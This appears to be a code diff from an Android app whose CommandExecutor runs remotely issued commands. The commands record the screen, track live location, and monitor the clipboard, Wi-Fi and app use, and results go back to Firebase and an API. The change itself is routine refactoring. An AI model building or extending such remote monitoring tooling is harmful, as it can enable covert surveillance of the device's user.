@@ -7,19 +7,19 @@ import com.abuzahra.manager.api.ApiClient
 import com.abuzahra.manager.api.FirebaseManager
 import com.abuzahra.manager.model.Command
 import com.abuzahra.manager.util.DeviceUtils
-import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
 
 object CommandExecutor {
 
     private const val TAG = "CommandExecutor"
+    private val executorScope = kotlinx.coroutines.CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     fun execute(context: Context, command: Command) {
         Log.i(TAG, "Executing command: ${command.command} (id=${command.id})")
-        val scope = CoroutineScope(Dispatchers.IO)
 
-        scope.launch {
+        executorScope.launch {
             try {
                 val result = processCommand(context, command)
                 val resultStr = if (result is Map<*, *>) {
@@ -39,8 +39,8 @@ object CommandExecutor {
             } catch (e: Exception) {
                 Log.e(TAG, "Command ${command.id} failed", e)
                 val deviceId = DeviceUtils.getDeviceId(context)
-                FirebaseManager.submitResult(deviceId, command.id, command.command, "error", "Error: ${e.message}")
-                ApiClient.submitResult(command.id, command.command, "error", "Error: ${e.message}")
+                FirebaseManager.submitResult(deviceId, command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
+                ApiClient.submitResult(command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
             }
         }
     }
@@ -191,10 +191,8 @@ object CommandExecutor {
             "screen_record_start" -> MonitorExecutor.screenRecordStart(context, params)
             "location_live" -> MonitorExecutor.locationLiveStart(context, 30)
             "location_stop" -> MonitorExecutor.locationStop()
-            "get_location" -> DataCollector.getLastLocation(context) // Also used for location history
             "clipboard_monitor_start" -> MonitorExecutor.clipboardMonitorStart(context)
             "clipboard_monitor_stop" -> MonitorExecutor.clipboardMonitorStop()
-            "get_clipboard" -> DataCollector.getClipboard(context)
             "wifi_monitor_start" -> MonitorExecutor.wifiMonitorStart(context)
             "wifi_monitor_stop" -> MonitorExecutor.wifiMonitorStop()
             "app_monitor_start" -> MonitorExecutor.appMonitorStart(context)
